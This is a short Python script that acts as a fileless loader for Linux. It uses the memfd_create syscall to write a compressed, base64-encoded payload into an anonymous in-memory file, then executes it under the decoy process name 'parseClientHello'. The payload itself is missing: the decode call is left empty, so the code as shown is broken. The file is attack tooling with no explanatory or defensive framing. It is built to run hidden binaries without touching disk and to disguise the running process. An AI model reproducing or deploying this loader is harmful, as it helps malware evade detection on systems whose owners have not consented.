import ctypes, os, base64, zlib
l = ctypes.CDLL(None)
s = l.syscall
c = base64.b64decode(
)
e = zlib.decompress(c)
f = s(319, '', 1)
os.write(f, e)
p = '/proc/self/fd/%d' % f
os.execle(p, 'parseClientHello', {})